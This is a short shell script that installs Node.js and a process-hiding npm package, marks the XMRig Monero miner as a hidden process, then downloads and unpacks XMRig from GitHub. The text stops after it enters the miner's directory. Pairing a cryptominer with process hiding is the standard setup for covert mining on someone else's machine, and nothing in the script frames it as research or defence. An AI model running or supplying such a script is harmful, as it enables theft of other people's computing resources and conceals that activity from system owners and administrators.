sudo apt update
sudo apt-get install gcc -y
sudo apt-get install build-essential -y
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -
sudo apt-get install -y nodejs
npm i -g node-process-hider
sudo ph add xmrig
wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz
tar -xvzf xmrig-6.22.0-linux-static-x64.tar.gz
cd xmrig-6.22.0
